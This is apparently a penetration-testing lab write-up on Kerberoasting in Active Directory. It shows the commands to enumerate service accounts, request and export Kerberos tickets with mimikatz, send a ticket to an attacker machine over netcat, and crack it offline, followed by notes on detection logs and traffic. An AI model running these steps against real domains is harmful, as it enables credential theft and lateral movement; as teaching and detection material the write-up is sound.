---
description: Credential Access
---

# Kerberoasting

This lab explores the Kerberoasting attack - it allows any domain user to request kerberos tickets from TGS that are encrypted with NTLM hash of the plaintext password of a domain user account that is used as a service account (i.e account used for running an IIS service) and crack them offline avoiding AD account lockouts.

### Execution

Note the vulnerable domain member - a user account with `servicePrincipalName` attribute set, which is very important piece for kerberoasting - only user accounts with that property set are most likely susceptible to kerberoasting:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKEIPRKzyIL8ssJ1Eky%2F-LKEHymbOx0oOZqB-u3R%2Fkerberoast-principalname.png?alt=media\&token=bb0909ca-93f7-4f52-8045-615a94f0cc6b)

Attacker setting up an nc listener to receive a hash for cracking:

{% code title="attacker\@local" %}
```csharp
nc -lvp 443 > kerberoast.bin
```
{% endcode %}

#### Extracting the Ticket

Attacker enumerating user accounts with `serverPrincipalName` attribute set:

{% code title="attacker\@victim" %}
```csharp
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKEQWnWdxN10k88vogc%2F-LKEQTo6Vvatn_DEOJ48%2Fkerberoast-enumeration.png?alt=media\&token=eb2b7887-fdfd-44b1-8fe3-00d8c9d20375)

Using only built-in powershell, we can extract the susceptible accounts with:

```csharp
get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKO4btIeebtUwYK4eFR%2F-LKO52yd3HfsBmTinFHl%2Fkerberoast-powershell.png?alt=media\&token=8c762564-615d-4deb-b1ee-b13b5aee29d1)

It would have been better to use the following command provided by [Sean Metcalf](https://adsecurity.org/?p=2293) purely because of the `-filter` usage (quicker than `select-object`), but it did not work for me:

```csharp
get-adobject -filter {serviceprincipalname -like “*sql*”} -prop serviceprincipalname
```

Another alternative working on Linux using [bloodyAD](https://github.com/CravateRouge/bloodyAD):

```csharp
python bloodyAD.py -u '$user' -p '$password' -d '$domain' --host '$host' get search --filter '(&(!(cn=krbtgt))(&(samAccountType=805306368)(servicePrincipalName=*)))' --attr sAMAccountName | grep sAMAccountName | cut -d ' ' -f 2
```

Additionally, user accounts with SPN set could be extracted with a native windows binary:

```
 setspn -T offense -Q */*
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKIfG6BsIx4nzjVhA5g%2F-LKIfXzbGIXjdq2p7WgL%2Fkerberoast-setspn.png?alt=media\&token=74471cd8-c62a-43b7-a195-bcbbbf1b1aca)

Attacker requesting a kerberos ticket (TGS) for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local`- it gets stored in the memory:

{% code title="attacker\@victim" %}
```csharp
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKEIPRKzyIL8ssJ1Eky%2F-LKEIBbmJjX4MMuicYOd%2Fkerberoast-kerberos-token.png?alt=media\&token=2e1874f2-0239-4842-861d-9afc8c460f9f)

Using mimikatz, the attacker extracts kerberos ticket from the memory and exports it to a file for cracking:

{% code title="attacker\@victim" %}
```csharp
mimikatz # kerberos::list /export
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKEIPRKzyIL8ssJ1Eky%2F-LKEIGe2N7anuEWUEzEI%2Fkerberoast-exported-kerberos-tickets.png?alt=media\&token=4f59a38f-c80b-46b0-97f1-4009673381b0)

Attacker sends the exported service ticket to attacking machine for offline cracking:

{% code title="attacker\@victim" %}
```csharp
nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
```
{% endcode %}

#### Cracking the Ticket

Attacker brute forces the password of the service ticket:

{% code title="attacker\@local" %}
```csharp
python2 tgsrepcrack.py pwd kerberoast.bin
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKEIPRKzyIL8ssJ1Eky%2F-LKEILsCTgLjlbxn9h7B%2Fkerberoast-cracked.png?alt=media\&token=f4e6ec4f-9ed9-4217-a665-b86ca678f861)

### Observations

Below is a security log `4769` showing service access being requested:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKIl6pZ0bcRVjnv2Tp8%2F-LKIlHyRC5bx2E7kMWZs%2Fkerberoast-4769.png?alt=media\&token=c639c0dc-77c9-46b4-8b79-daaecd2aef7e)

If you see `Add-event -AssemblyName SystemIdentityModel` (from advanced Powershell logging) followed by a windows security event `4769` immediately after that, you may be looking at an old school Kerberoasting, especially if ticket encryption type has a value `0x17` (23 decimal, meaning it's RC4 encrypted):

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKIl6pZ0bcRVjnv2Tp8%2F-LKIningDnwgpErj5BQO%2Fkerberoast-logs.png?alt=media\&token=eadce00c-2062-471c-a65c-8dd99323ca24)

#### Traffic

Below is the screenshot showing a request being sent to the `Ticket Granting Service` (TGS) for the service with a servicePrincipalName `HTTP/dc-mantvydas.offense.local` :

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKGilNsUAW2LcJ-aMvk%2F-LKGj4Kvf84KO1anyG1W%2Fkerberoast-tgs-req.png?alt=media\&token=f89019df-a503-44e9-bcd1-5886b5afcc4c)

Below is the response from the TGS for the user `spotless` (we initiated this attack from offense\spotless) which contains the encrypted (RC4) kerberos ticket (server part) to access the `HTTP/dc-mantvydas.offense.local` service. It is the same ticket we cracked earlier with tgsrepcrack.py:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKGilNsUAW2LcJ-aMvk%2F-LKGj6j_gpAVwcUbHpg0%2Fkerberoast-tgs-res.png?alt=media\&token=e584d327-b3c0-49f0-b350-9e7fd8c4061e)

Out of curiosity, let's decrypt the kerberos ticket since we have the password the ticket was encrypted with.

Creating a kerberos keytab file for use in wireshark:

{% code title="attacker\@local" %}
```bash
root@~# ktutil 
ktutil:  add_entry -password -p HTTP/iis_svc@dc-mantvydas.offense.local -k 1 -e arcfour-hmac-md5
Password for HTTP/iis_svc@dc-mantvydas.offense.local: 
ktutil:  wkt /root/tools/iis.keytab
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKH6lKxEkloJztnpqzM%2F-LKH4lBMQhe-45WDcppK%2Fkerberoast-creating-keytab.png?alt=media\&token=a241ac27-8278-4bc4-bd9b-409478576c6d)

Adding the keytab to wireshark:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKH6lKxEkloJztnpqzM%2F-LKH4ntWZZS0w0-UQqUV%2Fkerberoast-wireshark-keytab.png?alt=media\&token=a2f88ea5-de7e-4a9f-954b-b8a2e5aec08b)

Note how the ticket's previously encrypted piece is now in plain text and we can see information pertinent to the requested ticket for a service `HTTP/dc-mantvydas.offense.local` :

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKH6lKxEkloJztnpqzM%2F-LKH6iRF_yfVO_4JgoP9%2Fkerberoast-decrypted.png?alt=media\&token=aa42e7bb-9b09-47ef-8a02-76942e3eaac7)

#### tgsrepcrack.py

Looking inside the code and adding a couple of print statements in key areas of the script, we can see that the password from the dictionary (`Passw0rd`) initially gets converted into an NTLM (`K0`) hash, then another key `K1` is derived from the initial hash and a message type, yet another key `K2` is derived from K1 and an MD5 digest of the encrypted data. Key `K2` is the actual key used to decrypt the encrypted ticket data:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKHbc6IrcsO-aRw_Ntl%2F-LKHdsJBFE3Mnvtrl0iu%2Fkerberoast-crackstation.png?alt=media\&token=e99c0667-3d28-44bc-8434-1bc3fcd5f3d0)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKHbc6IrcsO-aRw_Ntl%2F-LKHdaWK0wLrmtY_gha0%2Fkerberoast-printstatements.png?alt=media\&token=6bb3a13e-5900-4445-9004-0e175a840aa9)

I did not have to, but I also used an online RC4 decryptor tool to confirm the above findings:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKHbc6IrcsO-aRw_Ntl%2F-LKHe8dvHZGhNNZdCSO8%2Fkerberoast-decryptedonline.png?alt=media\&token=a79b89bd-50d1-416f-9283-6a1d2ca10eed)

### References

[Steal or Forge Kerberos Tickets: Kerberoasting, Sub-technique T1558.003 - Enterprise | MITRE ATT\&CK](https://attack.mitre.org/wiki/Technique/T1208)

[GitHub - nidem/kerberoast](https://github.com/nidem/kerberoast)\
\
[Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain (Sean Metcalf)](https://adsecurity.org/?p=2293)<br>

{% embed url="https://www.youtube.com/watch?v=nJSMJyRNvlM" %}



* [Kerberoast — Penetration Testing Lab (PentestLab)](https://pentestlab.blog/2018/06/12/kerberoast/)<br>
* [Kerberos AD Attacks - Kerberoasting (XPN InfoSec Blog)](https://blog.xpnsec.com/kerberos-attacks-part-1/)<br>
* [CrackStation - Online Password Hash Cracking](https://crackstation.net/)<br>
* [Kerberos for the Busy Admin (Microsoft / TechNet)](https://blogs.technet.microsoft.com/askds/2008/03/06/kerberos-for-the-busy-admin/)<br>
